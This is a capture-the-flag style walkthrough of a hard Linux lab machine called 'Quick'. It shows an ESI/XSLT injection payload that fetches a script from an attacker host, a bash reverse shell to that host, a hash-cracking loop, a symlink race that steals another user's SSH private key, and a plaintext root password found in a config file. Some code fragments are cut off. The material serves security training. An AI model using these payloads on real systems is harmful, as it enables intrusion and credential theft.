Synopsis

Quick is a hard difficulty Linux machine that features a website running on the HTTP/3 protocol.
Enumeration of the website reveals default credentials. The client portal is found to be vulnerable
to ESI (Edge Side Includes) injection. This is used to obtain code execution and gain a foothold. A
weak password gives access to a printer console, which permits the addition of new printers.
Weak file permissions are exploited to move laterally. Plaintext credentials exposed in a
configuration are reused to escalate to root.

Foothold

ESI or Edge Side Includes, is a markup language used to dynamically include content from other
sources. However, if incorrectly implemented, this can be dangerous and lead to code execution.
This blogpost describes how ESIGate can be exploited via XSLT (eXtensible Stylesheet Language
Transformations) injection.
XSLT is used to transform XML documents to other XML formats. For example, XML input can be
transformed to XHTML. ESI provides the ability to load custom XSLT while processing data.
Let's verify if the server is vulnerable with the following payload:

   <esi:include src="http://example.com/" stylesheet="http://10.10.14.4/esi.xsl">
   </esi:include>
The payload above loads the stylesheet from our server http://10.10.14.4/esi.xsl and
applies it to the data from example.com . Raise another ticket with the above payload.

Next, start an HTTP server on port 80 and submit the ticket. Let's turn on Burp intercept and
search for the ticket ID. Sending this to the repeater (Ctrl + R) and forwarding it returns a 404
error.

Checking back on the HTTP server shows a request from the server.
This confirms that the server is allowed to load external stylesheets. Let's attempt to execute
code with the payload below.

   <?xml version="1.0" ?>
   <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
   <xsl:output method="xml" omit-xml-declaration="yes"/>
   <xsl:template match="/"

     xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
     xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">
   <root>
   <xsl:variable name="cmd"><![CDATA[curl http://10.10.14.4/shell -o /tmp/shell]]>
   </xsl:variable>
   <xsl:variable name="rtObj" select="rt:getRuntime()"/>
   <xsl:variable name="process" select="rt:exec($rtObj, $cmd)"/>
   Process: <xsl:value-of select="$process"/>
   Command: <xsl:value-of select="$cmd"/>
   </root>
   </xsl:template>
   </xsl:stylesheet>

Copy the contents above into a file named esi.xsl and create another file named shell with
the following contents:

   #!/bin/bash
   bash -i >& /dev/tcp/10.10.14.4/4444 0>&1

The command above sends a bash reverse shell to port 4444. We can resend the search request
through repeater, which should trigger the payload once again. This time the server retrieves the
esi.xml file from our box and process it, resulting in execution of the curl command.

Next, edit the XSL file with the following command:
   <xsl:variable name="cmd"><![CDATA[bash /tmp/shell]]>

This should execute the reverse shell present in /tmp/shell . Resending the search request
should return a shell as the user sam on port 4444.

We can put together PHP and bash scripts quickly to try and crack this password. The PHP script
below takes in a word as an argument and hashes it. This hash is checked against the one
obtained from database. An exit code of 0 is returned if the hash matches, else it returns 1.

   <?php
   $word = $argv[1];
   $hash = md5(crypt($word,'fa'));
   if($hash === 'e626d51f8fbfd1124fdea88396c35d05')

       exit(0);

The bash script below passes each word from rockyou.txt to the PHP script and checks if the
exit code is 0, in which case it outputs the password and exits.

   while read -r line; do

        php -f check.php $word

The code creates a file named with the current time and copies the input data to it. It then
retrieves printer information and initiates a connection to it. If the connection is successful, the
data is sent to the printer and then the job file is deleted.

We see that the file is created with 777 (i.e. world writable) permissions. As the server is running
as srvadm , this will let us hijack the file before it's read by the application and replace it with a
symlink to their SSH key.

A small bash script can be written to achieve this.

#!/bin/bash
while true
do

   job=`ls /var/www/jobs`
   if [[ $job ]]
   then

       echo $job
       ln -sf /home/srvadm/.ssh/id_rsa /var/www/jobs/$job
   fi
   sleep 0.1
done

The script runs in a loop and links any file found to the user's SSH key. Transfer the script using
wget and make sure the jobs folder is empty before running it.

wget 10.10.14.4/replace.sh
chmod +x replace.sh
./replace.sh

Return to the jobs page and create another job. After sending the job to the printer, a private SSH
key should be received.
The key can now be used to login to the box as srvadm .
Privilege Escalation

The home folder of this is found to contain a .cache directory.

It's possible for configurations and logs to contain plaintext credentials. Let's grep for such strings
with credentials.

   grep -ERni 'root|srvadm|password' .
The grep command above uses a regular expression ( -E ), to search the files in the current folder
recursively ( -R ). The search returns all strings matching root , srvadm or password irrespective
of their case ( -i ).

One of the configuration files is found to contain a password within a connection string, which is
URL encoded. The password &ftQ4K3SGde8? is found to be valid for root and can be used to
switch to it.
